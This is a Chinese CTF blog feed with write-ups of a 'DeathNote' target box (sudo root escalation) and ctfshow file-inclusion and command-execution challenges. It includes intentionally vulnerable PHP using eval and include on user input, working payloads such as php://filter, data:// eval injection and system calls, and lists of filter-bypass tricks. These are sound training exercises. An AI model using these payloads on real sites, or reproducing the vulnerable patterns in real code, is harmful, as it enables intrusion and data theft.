src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/35.jpg"></p><p><strong>用户 <code>kira</code>可执行所有命令</strong></p><p>查看<code>kira</code>家目录列表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> ~ &amp;&amp; <span class="hljs-keyword">ls</span> -lha<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/36.jpg"></p><p>查看 <code>kira.txt</code></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> kira.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/37.jpg"></p><p>发现又是一串 <code>base64</code>编码，进行解码查看内容</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/38.jpg"></p><p>可得知还有一个目录<code>/var</code>里面有可用信息，切换到该目录</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> /<span class="hljs-keyword">var</span> &amp;&amp; <span class="hljs-keyword">cat</span> misa<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/39.jpg"></p><p>貌似没有什么有用的信息</p><p>刚才通过查看 <code>kira</code>的权限，得知用户<code>kira</code>能执行任何命令，可通过<code>kira</code>直接拿到 <code>rootshell</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo su</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/40.jpg"></p><p>已切换到 <code>root</code>用户，查看 <code>/root</code>目录下的内容</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/root</span> &amp;&amp; cat root.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/41.jpg"></p><h2 id="目标靶机渗透结束"><a href="#目标靶机渗透结束" class="headerlink" title="目标靶机渗透结束"></a>目标靶机渗透结束</h2>]]></content>
    
    
    <categories>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 10:52:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    首先这是一个 file 关键字的get参数传递， <code>php://</code> 是一种协议名称(命令执行web37中也有简单介绍)， <code>php://filter/</code> 是一种访问本地文件的的协议， <code>/read=convert.base64-encode/</code> 表示读取的方式是base64编码， <code>resource=index.php</code> 表示目标文件名为index.php。</p><p>​    通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的<code>include()</code>函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p><p>​    而include的内容是由用户控制的，所以通过我们传递的 <code>file</code> 参数，是 <code>include()</code> 函数引入了index.php的base64编码格式，因为是<code>base64</code>编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p><p>所以最终的payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/78-1.jpg"></p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:10:14</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了 <code>php</code> ，所以可以使用 <code>data://</code> 协议进行绕过：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=file=data:<span class="hljs-regexp">//</span>text/plain,&lt;?=eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);?&gt;<br><span class="hljs-regexp">//</span> 一下是 POST 数据<br><span class="hljs-number">1</span>=system(<span class="hljs-string">&quot;tac falg.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>​    或者也可以使用下面的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?file=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs====&gt;<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/79-1.jpg"></p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow命令执行笔记</title>
    <link href="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;php<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析考点：</strong></p><p>这题中看到两个函数</p><p>​    <strong>eval()</strong></p><p>​    <strong>preg_match</strong></p><p>通过百度可知</p><p>​    <code>eval()</code> 函数的功能是获取返回值</p><p>​    <code>preg_match</code> 是执行正则表达式，在题中是起到一个过滤的作用。</p><p><strong>解题：</strong></p><p>​    在代码中，我们可以看到过滤了 flag 而且不区分大小写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">所需要使用的知识点 通配符<br><span class="hljs-number">1</span>. * 可以匹配<span class="hljs-number">0</span>或多个字符<br><span class="hljs-number">2</span>. ? 可以匹配任意一个字符<br><span class="hljs-number">3</span>. <span class="hljs-selector-attr">[abcd]</span> 匹配abcd中任何一个字符<br><span class="hljs-number">4</span>. <span class="hljs-selector-attr">[a-z]</span> 匹配范围<span class="hljs-selector-tag">a</span>到z，表示范围的意思 <span class="hljs-selector-attr">[]</span>匹配中括号中的任意一个字符<br></code></pre></td></tr></table></figure><p>​    所以在这 flag 可以用 f* 或 f??? 代替</p><p>​    所以这个题的payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat f*.php&quot;</span>);<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat f*&quot;</span>);<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat f???.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>​    也可以使用 cp 命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=system(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);    <span class="hljs-regexp">//</span>意思就是复制flag.php文件 明名为 <span class="hljs-number">1</span>.txt<br>url<span class="hljs-regexp">/1.txt/</span><span class="hljs-regexp">/然后查看1.txt</span><br></code></pre></td></tr></table></figure><p>​    再补充一个，绕过可以用引号，反斜杠</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">flag</span>=fl\ag=fl<span class="hljs-string">&#x27;&#x27;</span>ag<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/29-1.jpg"></p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;php<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: hlxa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span>: Modified by:hlxa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span>: Modified time: 2020-09-04 00:42:36</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: hlxa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: http://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了 flag,system,php关键字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所需知识点反引号执行命令<br></code></pre></td></tr></table></figure><p>​    因为过滤掉了 <code>system</code>，我们就得选择其他的命令执行函数</p><p>​    最常用的无需 <code>echo</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>. system()<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>. passthru()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>​    需用 <code>echo</code> 函数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 反引号 — `` 有 system() 的作用<br><span class="hljs-bullet">2.</span> exec();<br><span class="hljs-bullet">3.</span> shell<span class="hljs-emphasis">_exec();</span><br></code></pre></td></tr></table></figure><p><strong>实验：</strong></p><p>​    较上题比较，这题过滤多了 system 和 php</p><p>​    所以 flag.php 中php可以使用 p?p 或 p* 代替</p><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;cat fl&#x27;&#x27;ag.p?p&quot;</span>);<br><span class="hljs-string">?c</span>=echo (<span class="hljs-string">`cat fl&#x27;&#x27;ag.p?p`</span>);<br><span class="hljs-string">?c</span>=exec(<span class="hljs-string">`cp fl* 1.txt`</span>);<span class="hljs-regexp">//</span>然后接着访问 url/<span class="hljs-number">1</span>.txt<br><span class="hljs-string">?c</span>=shell_exec(<span class="hljs-string">&quot;cp f* 2.txt&quot;</span>);<span class="hljs-regexp">//</span>然后让问 url/<span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/30-1.jpg"></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/30-2.jpg"></p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这道题比之前的题多过滤了 cat,sort,shell,反斜杠(\),空格,点(.)</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> 过滤时，可以代替绕过的姿势<br></code></pre></td></tr></table></figure><ol><li><p><strong>tac: 从最后一行开始显示，是 cat 的反向显示</strong></p></li><li><p><strong>more: 一页一页的显示档案内容</strong></p></li><li><p><strong>less: 与 more 类似</strong></p></li><li><p><strong>head: 查看文档的前几行</strong></p></li><li><p><strong>tail: 查看文档的后几行</strong></p></li><li><p><strong>nl: 显示的时候，顺便输入行号</strong></p></li><li><p><strong>od: 以二进制的方式读取文档内容</strong></p></li><li><p><strong>vi: 一种编辑器</strong></p></li><li><p><strong>uniq: 查看</strong></p></li><li><p><strong>vim: 一种编译器</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">空格过滤时，可以代替绕过的姿势<br></code></pre></td></tr></table></figure></li><li><p> ${IFS}</p></li><li><p> $IFS$1</p></li><li><p> ${IFS</p></li><li><p> %20</p></li><li><p> &lt; 和 &lt;&gt; 重定向符</p></li><li><p> %09</p></li></ol><p><strong>实验：</strong></p><p>​    这道题过滤把主要的空格给过滤了，所以需要添加一个空格过滤符号。</p><p>​    这题的payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`more<span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;//more也可以写成less,nl,uniq,tac</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>passthru(<span class="hljs-string">&quot;tac%09f*&quot;</span>)<span class="hljs-comment">;//tac也可以写成less,nl,uniq,more</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo`strings<span class="hljs-variable">%09</span>f*`<span class="hljs-comment">;</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="hljs-string">&quot;nl%09fl*&quot;</span>)<span class="hljs-comment">;//等价于system。这个学到了! nl同样可以替换为more,less,uniq,tac,strings</span><br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/31-1.jpg"></p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    又过滤了 shell,单引号(‘),反引号(`),echo,分号(;),括号(())</p><p>​    分号可以使用 ?&gt; 代替，括号可以使用 “” 绕过，所以使用文件包含的方式</p><p><strong>实验：</strong></p><p>​    所以 payload 为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-string">&quot;$_GET[1]&quot;</span>?&gt;&amp;=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=falg.php<br></code></pre></td></tr></table></figure><p>​    这题还可以使用伪协议</p><figure class="highlight livecodeserver"><table><tr><td 